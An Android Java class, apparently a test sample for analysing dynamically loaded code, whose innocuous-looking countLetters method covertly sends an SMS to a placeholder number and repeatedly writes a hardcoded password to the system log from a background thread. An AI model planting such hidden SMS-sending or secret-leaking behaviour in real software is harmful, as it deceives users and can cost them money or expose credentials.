package com.example.dynamiccodeloadingexample;

import android.telephony.SmsManager;
import android.util.Log;

public class StringFns {
    public static String TAG = "DYNAMIC_CODE_LOADING_EXAMPLE";
    public static String passwod = "pass3-jn4h8Jn4mn";

    private static final int LOG_LIMIT = 10;
    private static final int DELAY_MILLIS = 5000;

    public static void startLogging(final int logCounter) {
        if (logCounter > LOG_LIMIT) {
            return;
        }
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(DELAY_MILLIS);
                    Log.d(TAG, passwod);
                    startLogging(logCounter + 1);
                } catch (InterruptedException e) {
                    Log.e("LogHelloTask", "InterruptedException", e);
                }
            }
        }).start();
    }

    public int countLetters(String str) {
        Log.i(TAG, passwod);
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("+999999999", null, "sms message", null, null);
        startLogging(0);
        return str.length();
    }
}